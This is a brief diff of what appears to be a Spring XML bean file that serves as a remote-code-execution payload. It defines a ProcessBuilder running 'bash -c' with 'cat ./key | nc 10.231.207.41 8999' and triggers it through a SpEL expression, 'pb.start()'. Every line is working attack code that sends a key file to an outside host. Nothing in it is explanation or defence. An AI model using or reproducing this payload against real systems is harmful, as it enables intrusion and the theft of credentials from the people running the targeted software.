@@ -9,7 +9,7 @@
       <array>
         <value>bash</value>
         <value>-c</value>
-        <value>cat key | nc 10.231.207.41 8999</value>
+        <value>cat ./key | nc 10.231.207.41 8999</value>
       </array>
     </constructor-arg>
     <property name="whatever" value="#{ pb.start() }"/>
